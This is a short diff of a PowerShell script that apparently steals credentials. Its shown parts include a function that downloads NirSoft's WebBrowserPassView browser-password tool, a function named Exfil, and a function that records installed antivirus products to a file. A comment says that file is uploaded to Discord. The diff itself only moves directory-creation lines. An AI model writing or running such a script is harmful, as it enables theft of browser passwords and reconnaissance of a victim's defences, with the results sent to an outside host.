@@ -1,4 +1,5 @@
 function Get-Nirsoft {
+    cd C:\
     mkdir \temp 
     cd \temp
     Invoke-WebRequest -Headers @{'Referer' = 'https://www.nirsoft.net/utils/web_browser_password.html'} -Uri https://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile wbpv.zip
@@ -50,9 +51,6 @@ function Exfil {
 
 
 function version-av {
-    # Create temp folder
-    mkdir \temp 
-    cd \temp
     Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Out-File -FilePath C:\Temp\AntiSpyware.txt -Encoding utf8
 
     # Upload AntiSpyware.txt to Discord
